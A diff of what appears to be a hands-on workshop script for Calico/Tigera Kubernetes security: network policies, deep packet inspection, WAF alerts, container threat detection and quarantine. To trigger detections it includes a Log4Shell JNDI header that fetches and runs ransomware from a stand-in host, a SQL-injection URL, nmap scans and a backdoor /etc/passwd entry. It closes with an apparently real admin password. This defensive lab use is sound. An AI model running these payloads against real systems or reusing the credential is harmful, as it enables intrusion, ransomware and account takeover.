@@ -1,6 +1,8 @@
 Script
 
+############################################
 ### Review and customize security guardrails for network-based threats
+############################################
 
 Review the policies 
  - Talk about the DNS policy in the security tier
@@ -16,12 +18,173 @@ Test access from redis to nginx-svc (wget)
 
 Test again.
 
+Now its your time! Create the policies for the wordpress application.
 
+- create a default-deny-wordpress staged for the wordpress namespace.
+- create a tier for the wordpress.
+- create the policies
+- change the main default-deny 
+- delete the default-deny-wordpress staged
 
 ### Configure IDS/IPS, workload-centric WAF, and DDoS protection
+
+- configure IDS/IPS for vote service
+
+First enable the Intrusion Detection
+
+kubectl apply -f - <<-EOF
+apiVersion: operator.tigera.io/v1
+kind: IntrusionDetection
+metadata:
+  name: tigera-secure
+spec:
+  componentResources:
+  - componentName: DeepPacketInspection
+    resourceRequirements:
+      limits:
+        cpu: "1"
+        memory: 1Gi
+      requests:
+        cpu: 100m
+        memory: 100Mi
+EOF
+
+- then, create a deep packet inspection for the vote application in the vote namespace.
+
+kubectl apply -f - <<-EOF
+apiVersion: projectcalico.org/v3
+kind: DeepPacketInspection
+metadata:
+  name: dpi-ids-vote
+  namespace: vote
+spec:
+  selector: app in {'vote'}
+EOF
+
+- test with 
+
+k get svc -n vote 
+
+curl -m2 http://xx.xxx.xx.xx./cmd.exe
+curl -m2 http://xx.xx.xx.xx/NessusTest
+
+See the results in service graph
+
+- protect the result app
+
+k edit -n vote deepacketinspection dpi-ids-vote
+
+  selector: app in {'vote', 'result'}
+
+- test with 
+
+k get svc -n vote 
+
+curl -m2 http://xx.xxx.xx.xx./cmd.exe
+curl -m2 http://xx.xx.xx.xx/NessusTest
+
+See the results in service graph
+
+Now its your time do the same to protect your wordpress application.
+
+You dont need to create another IntrusionDetection, just a DPI in the wordpress namespace targeting the wordpress application.
+
+- test with 
+
+k get svc -n vote 
+
+curl -m2 http://xx.xxx.xx.xx./cmd.exe
+curl -m2 http://xx.xx.xx.xx/NessusTest
+
+See the results in service graph
+
+kubectl apply -f - <<-EOF
+apiVersion: projectcalico.org/v3
+kind: DeepPacketInspection
+metadata:
+  name: dpi-ids-wordpress
+  namespace: wordpress
+spec:
+  selector: app == "wordpress"
+EOF
+
+--------------------------------
+--- WAF
+--------------------------------
+
+kubectl patch felixconfiguration default --type='merge' -p '{"spec":{"policySyncPathPrefix":"/var/run/nodeagent"}}'
+
+kubectl -n tigera-runtime-security annotate daemonset runtime-reporter unsupported.operator.tigera.io/ignore="true"
+kubectl -n tigera-runtime-security get daemonset.apps/runtime-reporter -o yaml | sed 's/15m/1m/g' | kubectl apply -f -
+
+
+kubectl apply -f - <<-EOF
+apiVersion: projectcalico.org/v3
+kind: GlobalAlert
+metadata:
+  name: waf-new-alert-rule-info
+spec:
+  summary: 'WAF new waf-alert-942100'
+  description: 'Test WAF Global Alert'
+  severity: 1
+  dataSet: waf
+  period: 1m
+  lookback: 1h
+  query: '"rule_info" IN {"*942100*"}'
+  threshold: 0
+  condition: gt
+EOF
+
+
+curl -v -H \
+  'X-Api-Version: ${jndi:ldap://jndi-exploit.attack:1389/Basic/Command/Base64/d2dldCBldmlsZG9lci54eXovcmFuc29td2FyZTtjaG1vZCAreCAvcmFuc29td2FyZTsuL3JhbnNvbXdhcmU=}' \
+  'wordpress.wordpress'
+
+
+  curl http://wordpress.wordpress//test/artists.php?artist=0+div+1+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1%2C2%2Ccurrent_user
+
+
+############################################
 ### Detect zero-day attacks based on suspicious container activity using syscalls, file access, and process information 
+############################################
+
+Threat Defence > Container Threat Detection - enable
+
+k run attacker --image ubuntu -- sleep infinity
+k exec attacker -it -- /bin/bash
+
+apt update
+apt-get install nmap
+nmap -sn $(hostname -i)/24
+nmap -T4 -F $(hostname -i)/24
+
+echo hacker:x:777:0:hacker:/tmp:/bin/bash >> /etc/passwd
+passwd hacker
+
+
+############################################
 ### Preview and enforce security policies to quarantine infected workloads
+############################################
+
+k label pod attacker quarantine="true"
+
+curl neverssl.com
+curl wordpress.wordpress
+curl 
+
+k label pod attacker quarantine-
+
+############################################
 ### Visualize security posture of your Kubernetes cluster 
+############################################
+
+- Activity > Timeline
+- Compliance reports
+  - CIS Benchmark
+  - Inventory
+  - Network Access
+  - Policy Audit
+
 
 admin
 23@IC1q$SMGc%v8N)5
